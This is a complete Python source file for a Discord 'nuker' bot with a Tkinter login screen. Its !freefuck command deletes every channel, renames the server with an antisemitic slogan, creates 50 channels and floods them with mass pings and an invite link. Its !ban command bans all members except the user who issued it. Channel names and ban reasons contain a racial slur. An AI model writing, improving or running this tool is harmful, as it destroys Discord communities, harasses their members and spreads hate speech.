import discord
import asyncio
import aiohttp
import json
import sys
import tkinter as tk
from tkinter import messagebox, IntVar
import threading

# --- CONFIGURATION ---
NEW_SERVER_NAME = 'AETHER IS A SLAVE TO ISRAEL'
NEW_SERVER_ICON_URL = 'https://media.discordapp.net/attachments/1387848499550359575/1485344666693013714/narva-peoples-republic-flag-v0-9xs94isgytpg1.webp?ex=69c18684&is=69c03504&hm=f9eb7522e266b87a48e4a6593ca5d0552d56ca4066dd9c4bf4f8ee558f5b837f&=&format=webp&width=864&height=576'

# --- AUTHENTICATION ---
LICENSE_KEY = "a" 

# --- BOT INTENTS ---
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

# --- BOT INITIALIZATION ---
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    """Startup message."""
    print(f'Logged in as {client.user}')
    print('------')

@client.event
async def on_member_update(before, after):
    """Placeholder for member update events if needed later."""
    pass

# --- HELPER FUNCTIONS ---
async def ban_member(member, reason):
    try:
        await member.ban(reason=reason)
        print(f'Banned {member.name}')
    except discord.Forbidden:
        print(f'Could not ban {member.name} (Missing permissions).')
        return False
    except discord.HTTPException as e:
        print(f'Could not ban {member.name}: {e}')
        return False
    return True

async def delete_channel(channel, reason):
    try:
        await channel.delete(reason=reason)
        print(f'Deleted channel: {channel.name}')
    except discord.Forbidden:
        print(f'Could not delete channel {channel.name} (Missing permissions).')
        return False
    except discord.HTTPException as e:
        print(f'Could not delete channel {channel.name}: {e}')
        return False
    return True

async def spam_channel(channel, message, ping_content):
    try:
        full_message = f"{ping_content}\n\n{message}"
        await asyncio.gather(*[channel.send(full_message) for _ in range(10)])
        print(f'Spammed {channel.name}')
    except discord.Forbidden:
        print(f'Could not spam in {channel.name} (Missing permissions).')
        return False
    except discord.HTTPException as e:
        print(f'Error during spam in {channel.name}: {e}')
        return False
    return True

async def edit_server(guild):
    try:
        await guild.edit(name=NEW_SERVER_NAME)
        print('Changed server name')
    except discord.Forbidden:
        print('Could not change server name (Missing permissions).')
        return False
    except discord.HTTPException as e:
        print(f'Could not change server name: {e}')
        return False
    
    if NEW_SERVER_ICON_URL:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NEW_SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        icon_data = await resp.read()
                        await guild.edit(icon=icon_data)
                        print('Changed server icon')
        except discord.Forbidden:
            print('Could not change server icon (Missing permissions).')
        except discord.HTTPException as e:
            print(f'Could not change server icon: {e}')
    return True

async def create_channels(guild, count):
    try:
        channels = await asyncio.gather(*[guild.create_text_channel('FUCKED BY NIGGAGPT') for _ in range(count)])
        print(f'Created {count} new channels')
        return channels
    except discord.Forbidden:
        print(f'Could not create channels (Missing permissions).')
        return []
    except discord.HTTPException as e:
        print(f'Could not create channels: {e}')
        return []

@client.event
async def on_message(message):
    if message.author.bot:
        return

    guild = message.guild

    # --- !help COMMAND ---
    if message.content == '!help':
        help_embed = discord.Embed(
            title="Caral-Bota Commands",
            description="A list of all available commands.",
            color=discord.Color.dark_red()
        )
        help_embed.add_field(name="Free Commands", value="`!freefuck` - Nukes the server with a preset message.", inline=False)
        help_embed.add_field(name="Ban Commands", value="`!ban` - Bans all members except the command user.", inline=False)
        await message.channel.send(embed=help_embed)
        return

    # --- !ban COMMAND ---
    if message.content == '!ban':
        print(f'!ban command received from {message.author.name} in guild: {guild.name}. Starting ban process...')
        try:
            # Get all members except the command user and bots
            members_to_ban = [member for member in guild.members if member != message.author and not member.bot]
            
            if not members_to_ban:
                await message.channel.send("No members to ban.")
                return
                
            # Ban members concurrently with error handling
            ban_tasks = [ban_member(member, 'Banned by NIGGAGPT') for member in members_to_ban]
            await asyncio.gather(*ban_tasks)
            
            await message.channel.send(f"Banned {len(members_to_ban)} members.")
            print('Ban process complete.')
        except Exception as error:
            print(f'A critical error occurred during the ban process: {error}')
        return

    # --- !freefuck COMMAND (FREE FOR EVERYONE) ---
    if message.content == '!freefuck':
        print(f'!freefuck command received from {message.author.name} in guild: {guild.name}. Starting free destruction...')
        try:
            # This message is now set by the GUI checkbox at startup
            preset_message = client.preset_message 

            # 1. Delete all channels and categories - CONCURRENTLY
            print('Step 1: Deleting channels and categories...')
            delete_tasks = [delete_channel(channel, 'FUCKED BY NIGGAGPT') for channel in guild.channels]
            results = await asyncio.gather(*delete_tasks)
            
            # Check if any channels were successfully deleted
            if any(results):
                print('Some channels were deleted successfully')
            else:
                print('No channels were deleted (likely due to missing permissions)')

            # 2. Change server name and icon
            print('Step 2: Updating server name and icon...')
            await edit_server(guild)

            # 3. Create new channels and spam ping - CONCURRENTLY
            print('Step 3: Creating new channels and spamming...')
            await asyncio.sleep(2)
            owner = guild.owner
            ping_content = f"@everyone {owner.mention} "
            for role in guild.roles:
                if role.name != "@everyone" and not role.is_bot_managed():
                    ping_content += f"{role.mention} "
            
            new_channels = await create_channels(guild, 50)
            if new_channels:
                spam_tasks = [spam_channel(channel, preset_message, ping_content) for channel in new_channels]
                await asyncio.gather(*spam_tasks)
            else:
                print('Skipping spam step as no channels were created')
                
            print('Free destruction complete.')
        except Exception as error:
            print(f'A critical error occurred during the free process: {error}')
        return

# --- GUI & LOGIN LOGIC ---

def run_bot(token, nsfw_mode):
    """Function to run the discord bot in a separate thread."""
    # Store the chosen preset message on the client object
    if nsfw_mode:
        client.preset_message = "# https://media.discordapp.net/attachments/1030022158241509417/1077147111495315476/itchy.gif https://cdn.discordapp.com/attachments/1359930288414916631/1371999099435487403/caption-1.gif @everyone https://discord.gg/qwXuTtURh"
    else:
        client.preset_message = "# @everyone https://discord.gg/qwXuTtURh chihiro freed in here"

    try:
        client.run(token)
    except discord.errors.LoginFailure:
        print("Login failed. Check your BOT_TOKEN.")
    except ImportError:
        print("Missing dependencies. Please run: pip install discord.py aiohttp")
    except Exception as e:
        print(f"An error occurred: {e}")

def start_gui():
    """Sets up and runs the Tkinter GUI for login with a Dark/Sigma theme."""
    root = tk.Tk()
    root.title("Indian femboy server fucker :3")
    root.geometry("400x380") # Increased height to fit checkbox
    root.configure(bg="#0f0f0f") # Dark background

# --- COLORS ---
    bg_color = "#0f0f0f"
    fg_color = "#ff0000"     # Sigma Red
    entry_bg = "#1f1f1f"     # Slightly lighter black for inputs
    text_color = "#ffffff"   # White text
    
    # Fonts
    font_header = ("Segoe UI", 20, "bold")
    font_label = ("Segoe UI", 10)
    font_btn = ("Segoe UI", 10, "bold")

    # Header Label
    header_label = tk.Label(root, text="AUTHENTICATION", font=font_header, bg=bg_color, fg=fg_color)
    header_label.pack(pady=(20, 30))

    # Key Label
    key_label = tk.Label(root, text="KEY", font=font_label, bg=bg_color, fg=text_color)
    key_label.pack(pady=(5, 0))

    # Key Entry
    key_entry = tk.Entry(root, width=40, bg=entry_bg, fg=text_color, insertbackground=fg_color, highlightbackground=bg_color, highlightthickness=1, relief="flat")
    key_entry.pack(pady=5)

    # Token Label
    token_label = tk.Label(root, text="BOT TOKEN", font=font_label, bg=bg_color, fg=text_color)
    token_label.pack(pady=(15, 0))

    # Token Entry
    token_entry = tk.Entry(root, width=40, show="*", bg=entry_bg, fg=text_color, insertbackground=fg_color, highlightbackground=bg_color, highlightthickness=1, relief="flat")
    token_entry.pack(pady=5)

    # --- NSFW Checkbox ---
    nsfw_var = IntVar()
    nsfw_check = tk.Checkbutton(root, text="NSFW", variable=nsfw_var, bg=bg_color, fg=text_color, selectcolor=entry_bg, activebackground=bg_color, activeforeground=text_color, font=font_label)
    nsfw_check.pack(pady=10)

    def on_login():
        entered_key = key_entry.get()
        entered_token = token_entry.get()

        if entered_key != LICENSE_KEY:
            messagebox.showerror("ACCESS DENIED", "INVALID LICENSE KEY")
            return
        
        if not entered_token:
            messagebox.showerror("ERROR", "ENTER BOT TOKEN")
            return

        # Get the state of the checkbox (1 if checked, 0 if not)
        is_nsfw = nsfw_var.get()

        # If valid, destroy GUI and start bot
        root.destroy()
        print("License accepted. Starting bot...")
        run_bot(entered_token, is_nsfw)

    # Login Button
    # Using a Frame to act as the button background since standard buttons are hard to style perfectly flat on all OS
    btn_frame = tk.Frame(root, bg=bg_color)
    btn_frame.pack(pady=20)
    
    login_button = tk.Button(btn_frame, text="INITIALIZE", font=font_btn, bg="#1f1f1f", fg=fg_color, activebackground=fg_color, activeforeground="black", width=20, relief="flat", command=on_login)
    login_button.pack()

    # Center Window
    root.eval('tk::PlaceWindow . center')

    root.mainloop()

if __name__ == "__main__":
    # Start the GUI
    start_gui()
    
    # --- SCRIPT END MARKER ---
    print("UwU")
